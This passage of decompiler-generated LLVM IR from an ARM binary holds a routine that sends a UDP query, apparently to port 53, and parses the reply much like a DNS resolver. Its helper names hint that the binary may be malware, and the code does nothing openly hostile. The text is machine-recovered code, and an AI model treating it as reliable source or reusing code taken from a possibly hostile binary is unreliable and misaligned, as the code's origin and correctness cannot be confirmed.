.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_e5d4.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_e5d4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_e5d4.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_e5d4 = phi i32 [ %v3_e5d4.pre, %.thread..thread7_crit_edge ], [ %v2_e604149, %bb ]
  %v1_e5d4.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_e5c4, %bb ]
  %v4_e5d4 = add i32 %v3_e5d4, -1
  %v5_e5d4 = inttoptr i32 %v4_e5d4 to i8*
  store i8 %v1_e5d4.off0, i8* %v5_e5d4, align 1
  %v0_e5d8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e5d8.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_e5d8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e5d8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_e5d811 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e5d811, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_e5e0 = load i32, i32* @lr, align 4
  %v2_e5e0 = urem i32 %v1_e5e0, 256
  store i32 %v2_e5e0, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_e5f433 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_e5e0, %.thread12 ]
  %v0_e5e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e5e4 = add i32 %v0_e5e4, 1
  store i32 %v1_e5e4, i32* %ip.global-to-local, align 4
  %v0_e5e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e5e8 = add i32 %v0_e5e8, 1
  store i32 %v1_e5e8, i32* %r2.global-to-local, align 4
  %v1_e5ec.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_e5ec = sub i32 %v1_e5ec.pre, %v1_e5e4
  store i32 %v2_e5ec, i32* %r3.global-to-local, align 4
  %v2_e5f0 = icmp eq i32 %v2_e5ec, 0
  store i1 %v2_e5f0, i1* %cpsr_z.global-to-local, align 1
  %v1_e5f4 = add nuw nsw i32 %v0_e5f433, 1
  store i32 %v1_e5f4, i32* @lr, align 4
  store i32 %v0_e5e8, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_e5ec, 1
  %extract.t152 = trunc i32 %v0_e5f433 to i8
  br i1 %tmp116, label %dec_label_pc_e600, label %dec_label_pc_e5c4

dec_label_pc_e600:                                ; preds = %bb115, %entry
  %v1_e5f8.lcssa = phi i32 [ %v1_e5f8147, %entry ], [ %v0_e5e8, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_e604 = inttoptr i32 %v1_e5f8.lcssa to i8*
  store i8 0, i8* %v4_e604, align 1
  store i32 %v2_e5a8, i32* %r0.global-to-local, align 4
  %v1_e60c = bitcast i32* %stack_var_-2232 to i8*
  %v2_e60c = call i32 @util_strlen(i8* %v1_e60c)
  %v2_e610 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_e610, i32* %r1.global-to-local, align 4
  %v1_e614 = load i32, i32* @sb, align 4
  %v2_e614 = add i32 %v1_e614, %v2_e60c
  store i32 %v2_e614, i32* @r5, align 4
  %v0_e61c = load i32, i32* @r4, align 4
  store i32 %v0_e61c, i32* %stack_var_-68, align 4
  store i32 %v2_e5a8, i32* %r0.global-to-local, align 4
  %v2_e62c = call i32 @util_strlen(i8* %v1_e60c)
  %v1_e630 = add i32 %v2_e62c, 17
  store i32 %v1_e630, i32* %r0.global-to-local, align 4
  %v0_e638 = call i32 @rand_next()
  %v1_e638 = sext i32 %v0_e638 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_e644 = mul nuw nsw i64 %v1_e638, 2147516417
  %v6_e644 = udiv i64 %v5_e644, 4294967296
  %v7_e644 = trunc i64 %v6_e644 to i32
  %v8_e644 = trunc i64 %v5_e644 to i32
  store i32 %v8_e644, i32* @lr, align 4
  store i32 %v7_e644, i32* %r2.global-to-local, align 4
  %v5_e6484 = udiv i64 %v5_e644, 140737488355328
  %v5_e648 = trunc i64 %v5_e6484 to i32
  %v6_e648 = add i32 %v5_e648, %v0_e638
  store i32 16, i32* @r1, align 4
  %v6_e654 = urem i32 %v6_e648, 65536
  store i32 %v6_e654, i32* %ip.global-to-local, align 4
  %v2_e65c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e65c, i32* @r0, align 4
  %v5_e660 = trunc i32 %v6_e648 to i16
  %v0_e664 = call i32 @util_zero()
  store i32 %v0_e664, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_e694 = load i32, i32* @r5, align 4
  %v1_e694 = add i32 %v0_e694, 1
  store i32 %v1_e694, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_e660, i16* %stack_var_-2244, align 2
  %v4_e6a8 = inttoptr i32 %v1_e694 to i16*
  store i16 256, i16* %v4_e6a8, align 2
  %v0_e6ac = load i32, i32* %r3.global-to-local, align 4
  %v1_e6ac = trunc i32 %v0_e6ac to i16
  %v2_e6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_e6ac = add i32 %v2_e6ac, 2
  %v4_e6ac = inttoptr i32 %v3_e6ac to i16*
  store i16 %v1_e6ac, i16* %v4_e6ac, align 2
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_e744 = ptrtoint i32* %stack_var_-196 to i32
  %v2_e76c = ptrtoint i32* %stack_var_-40 to i32
  %v2_e798 = ptrtoint i32* %stack_var_-52 to i32
  %v2_e7dc = ptrtoint i16* %stack_var_-4292 to i32
  %v2_e870 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_e878 = bitcast i32* %stack_var_-4280 to i8*
  %v4_e89c = zext i16 %tmp79 to i32
  %v2_e8a0 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_e6b8

dec_label_pc_e6b8:                                ; preds = %dec_label_pc_e824, %dec_label_pc_e600
  %v1_e6bc = phi i32 [ -1, %dec_label_pc_e600 ], [ %v0_e6b8.pre, %dec_label_pc_e824 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_e600 ], [ %v1_e824, %dec_label_pc_e824 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_e6b8 = icmp eq i32 %v1_e6bc, -1
  store i1 %v7_e6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6b8, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_e6b8
  store i32 %v1_e6bc, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_e6b8, %bb117
  store i32 59076, i32* @lr, align 4
  %v1_e6c0 = xor i1 %v7_e6b8, true
  call void @__pseudo_cond_branch(i1 %v1_e6c0, i32 ptrtoint (i32* @global_var_14a60.113 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r1, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e6d0 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_e6d0, i32* %r0.global-to-local, align 4
  %v7_e6d4 = icmp eq i32 %v3_e6d0, -1
  store i1 %v7_e6d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e6d0, i32* @r6, align 4
  br i1 %v7_e6d4, label %dec_label_pc_e864, label %dec_label_pc_e6e0

dec_label_pc_e6e0:                                ; preds = %bb118
  store i32 %v2_e65c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e6ec = call i32 @__libc_connect(i32 %v3_e6d0, i32 %v2_e65c, i32 16)
  store i32 %v3_e6ec, i32* %r0.global-to-local, align 4
  %v7_e6f0 = icmp eq i32 %v3_e6ec, -1
  store i1 %v7_e6f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6f0, label %dec_label_pc_e82c, label %dec_label_pc_e6f8

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e6e0
  %v0_e6f8 = load i32, i32* @r6, align 4
  store i32 %v0_e6f8, i32* %r0.global-to-local, align 4
  store i32 %v2_e5a4, i32* %r1.global-to-local, align 4
  store i32 %v1_e630, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e708 = call i32 @__libc_send(i32 %v0_e6f8, i32 %v2_e5a4, i32 %v1_e630, i32 16384)
  store i32 %v4_e708, i32* %r0.global-to-local, align 4
  %v7_e70c = icmp eq i32 %v4_e708, -1
  store i1 %v7_e70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e70c, label %dec_label_pc_e82c, label %dec_label_pc_e714

dec_label_pc_e714:                                ; preds = %dec_label_pc_e6f8
  %v0_e714 = load i32, i32* @r6, align 4
  store i32 %v0_e714, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e720 = call i32 @__libc_fcntl(i32 3, i32 %v0_e714)
  %v0_e724 = load i32, i32* @r6, align 4
  store i32 %v0_e724, i32* %r1.global-to-local, align 4
  %v1_e728 = or i32 %v2_e720, 2048
  store i32 %v1_e728, i32* @r2, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_e730 = call i32 @__libc_fcntl(i32 4, i32 %v0_e724)
  store i32 %v2_e730, i32* %r0.global-to-local, align 4
  store i32 %v2_e610, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_e744, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e74c

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e74c, %dec_label_pc_e714
  %v1_e750 = phi i32 [ %v1_e754, %dec_label_pc_e74c ], [ 4, %dec_label_pc_e714 ]
  store i32 0, i32* @r4, align 4
  %v3_e750 = add i32 %v1_e750, %v2_e744
  %v4_e750 = inttoptr i32 %v3_e750 to i32*
  store i32 0, i32* %v4_e750, align 4
  %v0_e754 = load i32, i32* %r3.global-to-local, align 4
  %v1_e754 = add i32 %v0_e754, 4
  store i32 %v1_e754, i32* %r3.global-to-local, align 4
  %v7_e758 = icmp eq i32 %v1_e754, 128
  br i1 %v7_e758, label %dec_label_pc_e760, label %dec_label_pc_e74c

dec_label_pc_e760:                                ; preds = %dec_label_pc_e74c
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e760 = load i32, i32* @r6, align 4
  %v3_e760 = udiv i32 %v0_e760, 32
  %v3_e768 = mul nuw nsw i32 %v3_e760, 4
  store i32 %v3_e768, i32* %r3.global-to-local, align 4
  %v2_e770 = add i32 %v3_e768, %v2_e76c
  store i32 %v2_e770, i32* @r5, align 4
  %v1_e774 = add i32 %v2_e770, -156
  %v2_e774 = inttoptr i32 %v1_e774 to i32*
  %v3_e774 = load i32, i32* %v2_e774, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e77c = urem i32 %v0_e760, 32
  store i32 %v1_e77c, i32* @r7, align 4
  %v7_e780 = shl i32 1, %v1_e77c
  %v8_e780 = or i32 %v3_e774, %v7_e780
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_e780, i32* %v2_e774, align 4
  %v0_e790 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e790, i32* %stack_var_-52, align 4
  store i32 %v2_e798, i32* @lr, align 4
  store i32 %v2_e610, i32* %ip.global-to-local, align 4
  %v0_e7a0 = load i32, i32* @r6, align 4
  %v1_e7a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_e7a0 = add i32 %v1_e7a0, %v0_e7a0
  store i32 %v2_e7a0, i32* %r0.global-to-local, align 4
  %v0_e7a8 = load i32, i32* @r4, align 4
  store i32 %v0_e7a8, i32* %r2.global-to-local, align 4
  store i32 %v0_e7a8, i32* %r3.global-to-local, align 4
  %v5_e7b4 = call i32 @__libc_select(i32 %v2_e7a0, i32 %v2_e744, i32 %v0_e7a8, i32 %v0_e7a8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_e7b4, i32* %r0.global-to-local, align 4
  %v7_e7b8 = icmp eq i32 %v5_e7b4, -1
  store i1 %v7_e7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7b8, label %dec_label_pc_e83c, label %dec_label_pc_e7c0

dec_label_pc_e7c0:                                ; preds = %dec_label_pc_e760
  %v1_e7c0 = load i32, i32* @r4, align 4
  %v9_e7c0 = icmp eq i32 %v5_e7b4, %v1_e7c0
  store i1 %v9_e7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e7c0, label %dec_label_pc_e81c, label %dec_label_pc_e7c8

dec_label_pc_e7c8:                                ; preds = %dec_label_pc_e7c0
  %v0_e7c8 = load i32, i32* @r5, align 4
  %v1_e7c8 = add i32 %v0_e7c8, -156
  %v2_e7c8 = inttoptr i32 %v1_e7c8 to i32*
  %v3_e7c8 = load i32, i32* %v2_e7c8, align 4
  %v1_e7cc = load i32, i32* @r7, align 4
  %v6_e7cc = ashr i32 %v3_e7c8, %v1_e7cc
  store i32 %v6_e7cc, i32* %r3.global-to-local, align 4
  %v1_e7d0 = urem i32 %v6_e7cc, 2
  %v2_e7d0 = icmp eq i32 %v1_e7d0, 0
  store i1 %v2_e7d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e7d0, label %dec_label_pc_e83c, label %dec_label_pc_e7d8

dec_label_pc_e7d8:                                ; preds = %dec_label_pc_e7c8
  store i32 %v2_e7dc, i32* @r5, align 4
  store i32 %v2_e7dc, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e7ec = load i32, i32* @r6, align 4
  store i32 %v0_e7ec, i32* %r0.global-to-local, align 4
  %v6_e7f8 = call i32 @__libc_recvfrom(i32 %v0_e7ec, i32 %v2_e7dc, i32 2048, i32 16384, i32 %v1_e7c0, i32 %v1_e7c0)
  store i32 %v6_e7f8, i32* %r4.global-to-local, align 4
  %v0_e800 = load i32, i32* @sb, align 4
  store i32 %v0_e800, i32* %r0.global-to-local, align 4
  %v1_e804 = inttoptr i32 %v0_e800 to i8*
  %v2_e804 = call i32 @util_strlen(i8* %v1_e804)
  %v1_e808 = add i32 %v2_e804, 17
  store i32 %v1_e808, i32* %r0.global-to-local, align 4
  %v0_e80c = load i32, i32* %r4.global-to-local, align 4
  %v3_e80c = icmp ult i32 %v0_e80c, %v1_e808
  %v9_e80c = icmp eq i32 %v0_e80c, %v1_e808
  store i1 %v9_e80c, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_e80c, label %dec_label_pc_e81c, label %dec_label_pc_e870

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e7d8, %dec_label_pc_e870, %dec_label_pc_e89c, %dec_label_pc_e7c0, %dec_label_pc_e864
  %v0_e81c = load i32, i32* @r8, align 4
  %v7_e81c = icmp eq i32 %v0_e81c, 5
  store i1 %v7_e81c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e81c, label %dec_label_pc_e83c, label %dec_label_pc_e824

dec_label_pc_e824:                                ; preds = %dec_label_pc_e82c, %dec_label_pc_e81c
  %v0_e824 = phi i32 [ %v0_e834, %dec_label_pc_e82c ], [ %v0_e81c, %dec_label_pc_e81c ]
  %v1_e824 = add i32 %v0_e824, 1
  %v0_e6b8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e6b8

dec_label_pc_e82c:                                ; preds = %dec_label_pc_e6f8, %dec_label_pc_e6e0
  %v0_e82c = phi i32 [ %v4_e708, %dec_label_pc_e6f8 ], [ %v3_e6ec, %dec_label_pc_e6e0 ]
  %v1_e82c = add i32 %v0_e82c, 2
  store i32 %v1_e82c, i32* %r0.global-to-local, align 4
  %v1_e830 = call i32 @sleep(i32 %v1_e82c)
  store i32 %v1_e830, i32* %r0.global-to-local, align 4
  %v0_e834 = load i32, i32* @r8, align 4
  %v7_e834 = icmp eq i32 %v0_e834, 5
  store i1 %v7_e834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e834, label %dec_label_pc_e83c, label %dec_label_pc_e824

dec_label_pc_e83c:                                ; preds = %dec_label_pc_e82c, %dec_label_pc_e81c, %dec_label_pc_e7c8, %dec_label_pc_e760, %dec_label_pc_e8a8, %dec_label_pc_e8b4.backedge
  %v0_e83c = load i32, i32* @r6, align 4
  store i32 %v0_e83c, i32* %r0.global-to-local, align 4
  %v1_e840 = call i32 @__GI___libc_close(i32 %v0_e83c)
  store i32 %v1_e840, i32* %r0.global-to-local, align 4
  %v0_e844 = load i32, i32* @fp, align 4
  %v1_e844 = inttoptr i32 %v0_e844 to i8*
  %v2_e844 = load i8, i8* %v1_e844, align 1
  %v3_e844 = zext i8 %v2_e844 to i32
  store i32 %v3_e844, i32* @r4, align 4
  %v2_e848 = icmp eq i8 %v2_e844, 0
  store i1 %v2_e848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e848, label %dec_label_pc_e98c, label %dec_label_pc_e850

dec_label_pc_e850:                                ; preds = %dec_label_pc_e83c, %dec_label_pc_e98c
  %v0_e850 = phi i32 [ %v0_e844, %dec_label_pc_e83c ], [ %v0_e9a0, %dec_label_pc_e98c ]
  store i32 %v0_e850, i32* %r0.global-to-local, align 4
  store i32 %v3_e578, i32* @r4, align 4
  store i32 %v9_e578, i32* @r6, align 4
  store i32 %v12_e578, i32* @r7, align 4
  store i32 %v15_e578, i32* @r8, align 4
  store i32 %v18_e578, i32* @sb, align 4
  store i32 %v21_e578, i32* @sl, align 4
  store i32 %v24_e578, i32* @fp, align 4
  store i32 %v27_e578, i32* @lr, align 4
  ret i32 %v0_e850

dec_label_pc_e864:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e868 = call i32 @sleep(i32 1)
  store i32 %v1_e868, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e81c

dec_label_pc_e870:                                ; preds = %dec_label_pc_e7d8
  store i32 %v2_e870, i32* @sb, align 4
  store i32 %v2_e870, i32* %r0.global-to-local, align 4
  %v2_e878 = call i32 @util_strlen(i8* %v1_e878)
  store i32 %v2_e76c, i32* @lr, align 4
  %v4_e884 = load i16, i16* %stack_var_-4292, align 2
  %v5_e884 = sext i16 %v4_e884 to i32
  store i32 %v5_e884, i32* %r3.global-to-local, align 4
  store i32 %v6_e648, i32* @r1, align 4
  %v1_e88c = load i32, i32* @sb, align 4
  %v9_e890 = icmp eq i16 %v4_e884, %v5_e660
  store i1 %v9_e890, i1* %cpsr_z.global-to-local, align 1
  %v2_e88c = add i32 %v2_e878, 5
  %v1_e894 = add i32 %v2_e88c, %v1_e88c
  store i32 %v1_e894, i32* %r0.global-to-local, align 4
  br i1 %v9_e890, label %dec_label_pc_e89c, label %dec_label_pc_e81c

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e870
  store i32 %v4_e89c, i32* %r3.global-to-local, align 4
  store i1 %v2_e8a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8a0, label %dec_label_pc_e81c, label %dec_label_pc_e8a8

dec_label_pc_e8a8:                                ; preds = %dec_label_pc_e89c
  %div = udiv i16 %tmp79, 256
  %v3_e8a8 = zext i16 %div to i32
  store i32 %v3_e8a8, i32* %r2.global-to-local, align 4
  %v1_e8ac = mul nuw nsw i32 %v4_e89c, 256
  %v4_e8b0 = and i32 %v1_e8ac, 65280
  %v5_e8b0 = or i32 %v4_e8b0, %v3_e8a8
  %v1_e8b4134 = add nsw i32 %v5_e8b0, -1
  %v3_e8b8135 = mul i32 %v1_e8b4134, 65536
  store i32 %v3_e8b8135, i32* %r3.global-to-local, align 4
  %v7_e8bc141 = icmp eq i32 %v3_e8b8135, -65536
  store i1 %v7_e8bc141, i1* %cpsr_z.global-to-local, align 1
  %v3_e8c0142 = urem i32 %v1_e8b4134, 65536
  store i32 %v3_e8c0142, i32* @r8, align 4
  br i1 %v7_e8bc141, label %dec_label_pc_e83c, label %dec_label_pc_e8c8

dec_label_pc_e8c8:                                ; preds = %dec_label_pc_e8a8, %dec_label_pc_e8b4.backedge
  %v3_e8c0144 = phi i32 [ %v3_e8c0, %dec_label_pc_e8b4.backedge ], [ %v3_e8c0142, %dec_label_pc_e8a8 ]
  %v0_e918143 = phi i32 [ %storemerge29, %dec_label_pc_e8b4.backedge ], [ %v1_e894, %dec_label_pc_e8a8 ]
  store i32 %v0_e918143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_e8d418 = inttoptr i32 %v0_e918143 to i8*
  %v2_e8d419 = load i8, i8* %v1_e8d418, align 1
  %v3_e8d420 = zext i8 %v2_e8d419 to i32
  store i32 %v3_e8d420, i32* %r2.global-to-local, align 4
  %v2_e8d821 = icmp eq i8 %v2_e8d419, 0
  store i1 %v2_e8d821, i1* %cpsr_z.global-to-local, align 1
  %v3_e8dc22 = mul nuw nsw i32 %v3_e8d420, 256
  store i32 %v3_e8dc22, i32* @r1, align 4
  br i1 %v2_e8d821, label %dec_label_pc_e910, label %dec_label_pc_e8e4.preheader

dec_label_pc_e8e4.preheader:                      ; preds = %dec_label_pc_e8c8, %dec_label_pc_e8d4.backedge
  %v1_e9b0 = phi i32 [ %v1_e9b050, %dec_label_pc_e8d4.backedge ], [ 1, %dec_label_pc_e8c8 ]
  %v0_e9a848 = phi i32 [ %v0_e9a8, %dec_label_pc_e8d4.backedge ], [ 0, %dec_label_pc_e8c8 ]
  %v0_e8f046 = phi i32 [ %v3_e8dc, %dec_label_pc_e8d4.backedge ], [ %v3_e8dc22, %dec_label_pc_e8c8 ]
  %v0_e8ec44 = phi i32 [ %v1_e9ac, %dec_label_pc_e8d4.backedge ], [ %v0_e918143, %dec_label_pc_e8c8 ]
  %v0_e8e442 = phi i32 [ %v3_e8d4, %dec_label_pc_e8d4.backedge ], [ %v3_e8d420, %dec_label_pc_e8c8 ]
  br label %dec_label_pc_e8e4

dec_label_pc_e8e4:                                ; preds = %dec_label_pc_e8e4.preheader, %dec_label_pc_e8ec
  %v0_e9a8 = phi i32 [ %v0_e9a848, %dec_label_pc_e8e4.preheader ], [ 1, %dec_label_pc_e8ec ]
  %v0_e8f0 = phi i32 [ %v0_e8f046, %dec_label_pc_e8e4.preheader ], [ %v3_e908, %dec_label_pc_e8ec ]
  %v0_e9ac = phi i32 [ %v0_e8ec44, %dec_label_pc_e8e4.preheader ], [ %v2_e8f8, %dec_label_pc_e8ec ]
  %v0_e8e4 = phi i32 [ %v0_e8e442, %dec_label_pc_e8e4.preheader ], [ %v3_e8fc, %dec_label_pc_e8ec ]
  %v7_e8e4 = icmp eq i32 %v0_e8e4, 191
  store i1 %v7_e8e4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_e8e4, 192
  br i1 %tmp, label %dec_label_pc_e9a8, label %dec_label_pc_e8ec

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e8e4
  %v1_e8ec = add i32 %v0_e9ac, 1
  %v2_e8ec = inttoptr i32 %v1_e8ec to i8*
  %v3_e8ec = load i8, i8* %v2_e8ec, align 1
  %v4_e8ec = zext i8 %v3_e8ec to i32
  %v2_e8f0 = or i32 %v4_e8ec, -49152
  %v0_e8f8 = load i32, i32* @r5, align 4
  %v1_e8f4 = add i32 %v0_e8f8, %v0_e8f0
  %v2_e8f8 = add i32 %v1_e8f4, %v2_e8f0
  store i32 %v2_e8f8, i32* %r3.global-to-local, align 4
  %v1_e8fc = inttoptr i32 %v2_e8f8 to i8*
  %v2_e8fc = load i8, i8* %v1_e8fc, align 1
  %v3_e8fc = zext i8 %v2_e8fc to i32
  store i32 %v3_e8fc, i32* %r2.global-to-local, align 4
  %v2_e900 = icmp eq i8 %v2_e8fc, 0
  store i1 %v2_e900, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_e908 = mul nuw nsw i32 %v3_e8fc, 256
  store i32 %v3_e908, i32* @r1, align 4
  br i1 %v2_e900, label %dec_label_pc_e910, label %dec_label_pc_e8e4

dec_label_pc_e910:                                ; preds = %dec_label_pc_e8d4.backedge, %dec_label_pc_e8ec, %dec_label_pc_e8c8
  %v1_e914 = phi i32 [ 1, %dec_label_pc_e8c8 ], [ %v1_e9b0, %dec_label_pc_e8ec ], [ %v1_e9b050, %dec_label_pc_e8d4.backedge ]
  %v0_e910 = phi i32 [ 0, %dec_label_pc_e8c8 ], [ 1, %dec_label_pc_e8ec ], [ %v0_e9a8, %dec_label_pc_e8d4.backedge ]
  %v7_e910 = icmp eq i32 %v0_e910, 1
  store i1 %v7_e910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e910, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_e910
  %v2_e914 = add i32 %v1_e914, 1
  store i32 %v2_e914, i32* %ip.global-to-local, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_e910, %bb119
  %v1_e918 = phi i32 [ %v1_e914, %dec_label_pc_e910 ], [ %v2_e914, %bb119 ]
  %v2_e918 = add i32 %v1_e918, %v0_e918143
  store i32 %v2_e918, i32* @r4, align 4
  %v3_e91c = inttoptr i32 %v2_e918 to i8*
  %v4_e91c = load i8, i8* %v3_e91c, align 1
  %v6_e91c = zext i8 %v4_e91c to i32
  store i32 %v6_e91c, i32* %r3.global-to-local, align 4
  %v1_e920 = add i32 %v2_e918, 1
  %v2_e920 = inttoptr i32 %v1_e920 to i8*
  %v3_e920 = load i8, i8* %v2_e920, align 1
  %v4_e920 = zext i8 %v3_e920 to i32
  store i32 %v4_e920, i32* %r2.global-to-local, align 4
  %v4_e924 = mul nuw nsw i32 %v4_e920, 256
  %v5_e924 = or i32 %v4_e924, %v6_e91c
  store i32 %v5_e924, i32* %r3.global-to-local, align 4
  %v7_e928 = icmp eq i32 %v5_e924, 256
  store i1 %v7_e928, i1* %cpsr_z.global-to-local, align 1
  %v1_e92c = add i32 %v2_e918, 10
  store i32 %v1_e92c, i32* @r7, align 4
  br i1 %v7_e928, label %dec_label_pc_e9c8, label %dec_label_pc_e934

dec_label_pc_e934:                                ; preds = %dec_label_pc_e9c8, %bb120
  store i32 %v1_e92c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e94024 = inttoptr i32 %v1_e92c to i8*
  %v2_e94025 = load i8, i8* %v1_e94024, align 1
  %v3_e94026 = zext i8 %v2_e94025 to i32
  store i32 %v3_e94026, i32* %r2.global-to-local, align 4
  %v2_e94427 = icmp eq i8 %v2_e94025, 0
  store i1 %v2_e94427, i1* %cpsr_z.global-to-local, align 1
  %v3_e94828 = mul nuw nsw i32 %v3_e94026, 256
  store i32 %v3_e94828, i32* @r1, align 4
  br i1 %v2_e94427, label %dec_label_pc_e97c, label %dec_label_pc_e950.preheader

dec_label_pc_e950.preheader:                      ; preds = %dec_label_pc_e934, %dec_label_pc_e940.backedge
  %v1_e9c0 = phi i32 [ %v1_e9c065, %dec_label_pc_e940.backedge ], [ 1, %dec_label_pc_e934 ]
  %v0_e9b863 = phi i32 [ %v0_e9b8, %dec_label_pc_e940.backedge ], [ 0, %dec_label_pc_e934 ]
  %v0_e95c61 = phi i32 [ %v3_e948, %dec_label_pc_e940.backedge ], [ %v3_e94828, %dec_label_pc_e934 ]
  %v0_e95859 = phi i32 [ %v1_e9bc, %dec_label_pc_e940.backedge ], [ %v1_e92c, %dec_label_pc_e934 ]
  %v0_e95057 = phi i32 [ %v3_e940, %dec_label_pc_e940.backedge ], [ %v3_e94026, %dec_label_pc_e934 ]
  br label %dec_label_pc_e950

dec_label_pc_e950:                                ; preds = %dec_label_pc_e950.preheader, %dec_label_pc_e958
  %v0_e9b8 = phi i32 [ %v0_e9b863, %dec_label_pc_e950.preheader ], [ 1, %dec_label_pc_e958 ]
  %v0_e95c = phi i32 [ %v0_e95c61, %dec_label_pc_e950.preheader ], [ %v3_e974, %dec_label_pc_e958 ]
  %v0_e9bc = phi i32 [ %v0_e95859, %dec_label_pc_e950.preheader ], [ %v2_e964, %dec_label_pc_e958 ]
  %v0_e950 = phi i32 [ %v0_e95057, %dec_label_pc_e950.preheader ], [ %v3_e968, %dec_label_pc_e958 ]
  %v7_e950 = icmp eq i32 %v0_e950, 191
  store i1 %v7_e950, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_e950, 192
  br i1 %tmp159, label %dec_label_pc_e9b8, label %dec_label_pc_e958

dec_label_pc_e958:                                ; preds = %dec_label_pc_e950
  %v1_e958 = add i32 %v0_e9bc, 1
  %v2_e958 = inttoptr i32 %v1_e958 to i8*
  %v3_e958 = load i8, i8* %v2_e958, align 1
  %v4_e958 = zext i8 %v3_e958 to i32
  %v2_e95c = or i32 %v4_e958, -49152
  %v0_e964 = load i32, i32* @r5, align 4
  %v1_e960 = add i32 %v0_e964, %v0_e95c
  %v2_e964 = add i32 %v1_e960, %v2_e95c
  store i32 %v2_e964, i32* %r3.global-to-local, align 4
  %v1_e968 = inttoptr i32 %v2_e964 to i8*
  %v2_e968 = load i8, i8* %v1_e968, align 1
  %v3_e968 = zext i8 %v2_e968 to i32
